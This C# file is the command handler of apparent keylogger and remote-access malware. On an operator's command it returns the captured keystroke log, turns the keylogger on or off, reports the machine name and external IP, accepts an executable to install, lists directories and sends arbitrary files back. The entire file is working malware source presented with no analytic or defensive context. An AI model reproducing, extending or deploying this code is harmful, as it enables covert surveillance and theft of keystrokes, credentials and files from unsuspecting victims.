using System;
using System.IO;
using System.Net;
using System.Text;

namespace SWK
{
    public static class CommandHandler
    {
        public static readonly string[] Commands = { "/DownLog", "/Enabled ", "/UserName", "/ExternalIp", "/InstallExe ", "/DownloadFile ", "/Exists ", "/FilesInDirectory " };

        public static byte[] Handler(string command)
        {
            byte[] Response;

            if (command.Contains("/DownLog"))
            {
                if (File.Exists(KeyLogger.LoggerPath))
                    Response = File.ReadAllBytes(KeyLogger.LoggerPath);
                else
                    Response = new byte[1];

                return Response;
            }
            else if (command.Contains("/Enabled "))
            {
                bool status = bool.Parse(command.Split(' ')[1]);

                if (status)
                    KeyLogger.StartProcess();
                else
                    KeyLogger.Stop();

                Response = Encoding.Default.GetBytes(status.ToString());
                return Response;
            }
            else if (command.Contains("/UserName"))
            {
                Response = Encoding.Default.GetBytes(Environment.MachineName);
                return Response;
            }
            else if (command.Contains("/ExternalIp"))
            {
                StreamReader reader;
                HttpWebRequest httpWebRequest;
                HttpWebResponse httpWebResponse;
                httpWebRequest = (HttpWebRequest)HttpWebRequest.Create("http://checkip.dyndns.org");
                httpWebResponse = (HttpWebResponse)httpWebRequest.GetResponse();
                reader = new StreamReader(httpWebResponse.GetResponseStream());
                string Ip = System.Text.RegularExpressions.Regex.Match(reader.ReadToEnd(), @"(\d{1,3}\.\d{1,3}\.\d{1,3}\.\d{1,3})").Groups[1].Value;
                Response = Encoding.Default.GetBytes(Ip);
                return Response;
            }
            else if (command.Contains("/InstallExe "))
            {
                int startFileName = command.IndexOf('"') + 1;
                int finishFileName = command.IndexOf('"', startFileName + 1);
                string FileName = command.Substring(startFileName, (finishFileName - startFileName));

                Program.Client.FileNameBuffer = FileName;
                Program.Client.DataType = DataType.File;

                Response = Encoding.Default.GetBytes("!IES");
                return Response;
            }
            else if (command.Contains("/Exists "))
            {
                int startFileName = command.IndexOf('"') + 1;
                int finishFileName = command.IndexOf('"', startFileName + 1);
                string FileName = command.Substring(startFileName, (finishFileName - startFileName));

                if (File.Exists(FileName) || Directory.Exists(FileName))
                    Response = Encoding.Default.GetBytes("True");
                else
                    Response = Encoding.Default.GetBytes("False");

                return Response;
            }
            else if (command.Contains("/FilesInDirectory "))
            {
                int startDirectoryName = command.IndexOf('"') + 1;
                int finishDirectoryName = command.IndexOf('"', startDirectoryName + 1);
                string DirectoryName = command.Substring(startDirectoryName, (finishDirectoryName - startDirectoryName));

                bool FullInfo = false;

                if (command.Contains("-info"))
                    FullInfo = true;

                StringBuilder response = new StringBuilder();

                foreach (string file in Directory.GetFiles(DirectoryName))
                {
                    FileInfo File = new FileInfo(file);

                    if (FullInfo == false)
                        response.Append($"[FileName=\"{File.Name}\"; Path=\"{File.FullName}\"; Size=\"{File.Length}\"; Attributes=\"{File.Attributes}\"]");
                    else
                    {
                        response.Append($"FileName=\"{File.Name}\"; Path=\"{File.FullName}\"; Size=\"{File.Length}\"; Attributes=\"{File.Attributes}\"; LastWriteTime=\"{File.LastWriteTime}\"; LastAccessTime=\"{File.LastAccessTime}\"; Exists=\"{File.Exists}\"]");
                    }
                }

                Response = Encoding.Default.GetBytes(response.ToString());

                return Response;
            }
            else if (command.Contains("/DownloadFile "))
            {
                int startFileName = command.IndexOf('"') + 1;
                int finishFileName = command.IndexOf('"', startFileName + 1);
                string FileName = command.Substring(startFileName, (finishFileName - startFileName));

                if (File.Exists(FileName))
                    Response = File.ReadAllBytes(FileName);
                else
                    Response = new byte[1];

                return Response;
            }
            else
            {
                Response = new byte[1];
                return Response;
            }
        }
    }
}
